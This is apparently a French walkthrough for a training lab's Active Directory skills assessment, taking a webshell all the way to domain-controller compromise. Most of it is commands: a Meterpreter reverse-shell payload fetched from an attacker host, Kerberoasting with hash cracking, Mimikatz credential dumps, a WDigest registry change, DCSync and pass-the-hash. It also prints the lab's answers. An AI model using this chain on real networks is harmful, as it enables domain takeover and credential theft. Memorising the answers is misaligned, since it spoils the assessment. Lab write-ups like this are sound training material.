# SKILLS ASSESSMENT I

***

### <mark style="color:red;">**Scénario**</mark>

Nous disposons d'un Webshell sur un serveur accessible publiquement et connecté à un domaine. L'objectif est d'escalader les privilèges jusqu'à la compromission du Domain Controller (DC).

***

### <mark style="color:red;">**Question 1 : Récupération du Flag sur le Web Server**</mark>

1. **Accès au Webshell**
   * Naviguer vers `/uploads/antak.aspx`
   * Entrer les identifiants fournis
2. **Lecture du fichier `flag.txt`**
   * Utiliser la commande `dir` pour explorer l'arborescence.
   *   Lire le fichier avec :

       ```powershell
       type C:\Users\Administrator\Desktop\flag.txt
       ```

***

### <mark style="color:red;">**Question 2 : Kerberoasting sur MSSQLSvc / SQL01**</mark>

1. **Obtenir un shell interactif (Meterpreter)**
   *   Générer un payload avec `msfvenom` :

       {% code overflow="wrap" fullWidth="true" %}
       ```bash
       msfvenom -p windows/x64/meterpreter/reverse_https lhost=10.10.14.167 -f exe -o backupscript.exe LPORT=4444
       ```
       {% endcode %}
   *   Déployer le fichier via `Invoke-WebRequest` :

       {% code overflow="wrap" %}
       ```powershell
       Invoke-WebRequest -Uri "http://10.10.14.124:8000/backup.exe" -OutFile "C:\windows\system32\inetsrv\backup.exe"
       ```
       {% endcode %}
   * Écouter la connexion sur Metasploit : `exploit/multi/handler`
2. **Kerberoasting avec PowerView**
   *   Importer PowerView :

       {% code overflow="wrap" fullWidth="true" %}
       ```powershell
       Invoke-WebRequest -Uri "http://10.10.14.124:8000/PowerView.ps1" -OutFile "C:\PowerView.ps1"
       ```
       {% endcode %}
   *   Identifier l'utilisateur Kerberoastable :

       ```powershell
       Get-DomainUser * -spn | select samaccountname
       ```
   * **Utilisateur ciblé :** `svc_sql`

***

### <mark style="color:red;">**Question 3 : Cracking du mot de passe**</mark>

1.  **Extraction du ticket TGS**

    ```powershell
    Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat
    ```

    * Sauvegarde du hash
2.  **Cracking avec Hashcat**

    ```bash
    hashcat -m 13100 -a 0 /tmp/svc_sql_Hashe.txt /usr/share/wordlists/rockyou.txt
    ```

    * **Mot de passe :** `lucky7`

***

### <mark style="color:red;">**Question 4 : Récupération du Flag sur MS01**</mark>

1.  **Connexion en PSSession**

    {% code overflow="wrap" %}
    ```powershell
    $user = "inlanefreight\svc_sql"
    $Password = ConvertTo-SecureString "lucky7" -AsPlainText -Force
    $credentials = New-Object System.Management.Automation.PSCredential ($user, $Password)
    Enter-PSSession -ComputerName "MS01.inlanefreight.local" -Credential $credentials
    ```
    {% endcode %}
2.  **Récupération du Flag**

    ```powershell
    type C:\Users\Administrator\Desktop\flag.txt
    ```

    * **Flag :** `spn$_r0ast1ng_on_@n_0p3n_f1re`

***

### <mark style="color:red;">**Question 5 & 6 : Extraction de mots de passe en clair**</mark>

1.  **Dump des identifiants avec Mimikatz**

    ```powershell
    sekurlsa::logonpasswords
    ```

    * **Utilisateur trouvé :** `tpetty`
2.  **Activer l'enregistrement des credentials en clair**

    {% code overflow="wrap" fullWidth="true" %}
    ```powershell
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -Value 1
    Restart-Computer
    ```
    {% endcode %}

    * **Mot de passe :** `Sup3rS3cur3D0m@inU2eR`

***

### <mark style="color:red;">**Question 7 : Privileges d'attaque de tpetty**</mark>

1.  **Vérifier les permissions avec PowerView**

    {% code overflow="wrap" %}
    ```powershell
    $sid= Convert-NameToSid tpetty
    Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid}
    ```
    {% endcode %}

    * **Attaque possible :** `DCSync`

***

### <mark style="color:red;">**Question 8 : Compromission du Domaine et Extraction du Flag**</mark>

1.  **DCSync Attack avec Mimikatz**

    {% code overflow="wrap" %}
    ```powershell
    mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
    ```
    {% endcode %}

    * **Hash Admin :** `27dedb1dab4d8545c6e1c66fba077da0`
2. **Connexion à DC01 via Evil-WinRM**
   *   Port forwarding :

       ```powershell
       portfwd add -l 9999 -p 5985 -r 172.16.6.3
       ```
   *   Connexion :

       {% code overflow="wrap" %}
       ```bash
       evil-winrm -i localhost --port 9999 -u Administrator -H 27dedb1dab4d8545c6e1c66fba077da0
       ```
       {% endcode %}
3.  **Récupération du Flag final**

    ```powershell
    type C:\Users\Administrator\Desktop\flag.txt
    ```

***
